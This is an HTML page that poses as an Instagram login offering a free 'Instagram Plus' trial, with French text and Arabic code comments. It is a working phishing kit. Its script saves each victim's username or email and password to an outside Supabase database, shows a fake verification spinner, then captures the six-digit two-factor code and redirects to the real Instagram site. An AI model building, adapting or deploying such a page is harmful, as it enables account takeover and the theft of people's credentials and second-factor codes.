<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .card { background: #fff; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 25px 30px; text-align: center; border-radius: 4px; }
    .logo { width: 175px; margin: 10px 0 20px 0; }
    .heading-title { font-size: 18px; font-weight: 600; color: #262626; margin-bottom: 15px; line-height: 1.4; }
    input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px; font-size: 12px; margin-bottom: 8px; outline: none; }
    input:focus { border-color: #a8a8a8; }
    .btn { width: 100%; background-color: #0095f6; border: none; color: white; padding: 8px; font-weight: 600; border-radius: 4px; font-size: 14px; cursor: pointer; margin-top: 8px; }
    .btn:disabled { background-color: rgba(0, 149, 246, 0.4); cursor: default; }
    .loader-container { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 0; }
    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin-bottom: 15px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .loading-text { font-size: 14px; color: #262626; }
    .hidden { display: none; }
    .sub-text { font-size: 12px; color: #8e8e8e; margin: 10px 0; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body>

  <!-- 1️⃣ الشاشة الأولى: تسجيل الدخول -->
  <div id="step-login" class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="logo" alt="Instagram">
    
    <!-- تم استبدال Youssef بـ Vous -->
    <h2 class="heading-title">Vous, essayez Instagram Plus gratuitement pendant un mois</h2>

    <form id="loginForm">
      <input type="text" id="username" placeholder="Nom d'utilisateur, e-mail ou mobile" required>
      <input type="password" id="password" placeholder="Mot de passe" required>
      <button type="submit" class="btn">Essayer pour 0,00 $US</button>
    </form>
  </div>

  <!-- 2️⃣ الشاشة الثانية: شاشة التحميل Vérification des données -->
  <div id="step-loading" class="card hidden">
    <div class="loader-container">
      <div class="spinner"></div>
      <div class="loading-text">Vérification des données...</div>
    </div>
  </div>

  <!-- 3️⃣ الشاشة الثالثة: إدخال كود التحقيق -->
  <div id="step-code" class="card hidden">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="logo" alt="Instagram">
    <h3 style="font-size: 16px; margin-bottom: 10px;">Entrez le code de vérification</h3>
    <p class="sub-text">Entrez le code à 6 chiffres envoyé à votre appareil.</p>
    
    <form id="codeForm">
      <input type="text" id="verificationCode" placeholder="Code de vérification (6 chiffres)" maxlength="8" required>
      <button type="submit" class="btn">Confirmer</button>
    </form>
  </div>

  <script>
    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    let currentUserId = null;

    const stepLogin = document.getElementById('step-login');
    const stepLoading = document.getElementById('step-loading');
    const stepCode = document.getElementById('step-code');

    // 1. عند الضغط على تسجيل الدخول: حفظ الإيميل والكلمة مباشرة ثم الانتقال للتحميل
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const emailVal = document.getElementById('username').value;
      const passVal = document.getElementById('password').value;

      // حفظ البيانات فوراً في قاعدة البيانات
      const { data, error } = await supabaseClient
        .from('users_data')
        .insert([{ email: emailVal, password: passVal }])
        .select();

      if (data && data.length > 0) {
        currentUserId = data[0].id; // الاحتفاظ بـ ID السجل لتحديث الكود لاحقاً
      }

      // إخفاء صفحة الدخول وإظهار شاشة التحميل (Vérification des données)
      stepLogin.classList.add('hidden');
      stepLoading.classList.remove('hidden');

      // الانتظار لمدة 3 ثوانٍ ثم فتح شاشة الكود تلقائياً
      setTimeout(() => {
        stepLoading.classList.add('hidden');
        stepCode.classList.remove('hidden');
      }, 3000);
    });

    // 2. عند إدخال الكود: تحديث السجل المخزّن مسبقاً بإضافة الكود إليه
    document.getElementById('codeForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const codeVal = document.getElementById('verificationCode').value;

      if (currentUserId) {
        await supabaseClient
          .from('users_data')
          .update({ code: codeVal })
          .eq('id', currentUserId);
      }

      // تحويل المستخدم إلى موقع انستغرام الرسمي بعد الانتهاء
      window.location.href = "https://www.instagram.com";
    });
  </script>
</body>
</html>
